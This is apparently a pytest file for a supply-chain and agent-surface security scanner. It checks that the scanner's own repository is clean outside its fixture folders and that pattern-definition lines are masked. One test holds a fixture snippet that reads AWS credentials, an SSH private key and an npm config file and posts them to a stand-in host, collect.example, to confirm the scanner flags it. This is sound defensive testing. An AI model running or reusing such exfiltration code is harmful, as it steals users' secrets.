"""41차 D4 — 자기 검사(개밥먹기). 이 저장소를 37~41차 엔진으로 검사하면 **의도된 fixture 밖**에서는 깨끗해야 한다.

의도된 fixture: tests/(개발용 fixture), eval_corpus/(벤치마크·홀드아웃), rules/(룰 카드 예제), docs/.
그 밖(src·scripts·config·.github·루트 설정)에서 공급망·에이전트 발견이 나오면 자기참조 오탐이거나 진짜 문제다.
"""
from __future__ import annotations

from pathlib import Path

from gvskb.scanner import DEFAULT_EXCLUDE_DIRS, scan_path
from gvskb.scanners.agent_surface import _mask_pattern_definition_lines, scan_agent_surface

REPO = Path(__file__).resolve().parent.parent
_INTENDED = ("tests/", "eval_corpus/", "rules/", "docs/")
_PREFIXES = ("GOV-AUTOEXEC-", "GOV-AGENT-", "GOV-MCP-", "GOV-HIDDEN-", "GOV-BIDI-", "GOV-CI-", "GOV-NPM-",
             "GOV-RUNTIME-", "GOV-ELECTRON-", "GOV-VSCODE-", "GOV-CHROME-")


def _norm(p: str) -> str:
    return p.replace("\\", "/")


def test_checker_repo_is_clean_under_its_own_supply_chain_rules() -> None:
    r = scan_path(REPO, exclude_dirs=set(DEFAULT_EXCLUDE_DIRS) | {"eval_corpus", "tests", "docs", "dist", "build"})
    rows = sorted({(_norm(f.location.file), f.rule_id, f.confidence) for f in r.findings
                   if f.rule_id.startswith(_PREFIXES) and not _norm(f.location.file).startswith(_INTENDED)})
    assert rows == [], rows


def test_pattern_definition_lines_are_masked_but_call_sites_remain() -> None:
    src = (REPO / "src" / "gvskb" / "scanners" / "agent_surface.py").read_text(encoding="utf-8")
    assert [f.rule_id for f in scan_agent_surface(src, filename="agent_surface.py")] == []
    code = (
        "import os, requests\n"
        "d = open(os.path.expanduser('~/.aws/credentials')).read()\n"
        "d += open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
        "d += open(os.path.expanduser('~/.npmrc')).read()\n"
        "requests.post('https://collect.example/u', data=d)\n"
    )
    assert _mask_pattern_definition_lines(code) == code
    assert [f.rule_id for f in scan_agent_surface(code, filename="a.py")] == ["GOV-AGENT-CRED-EXFIL-001"]
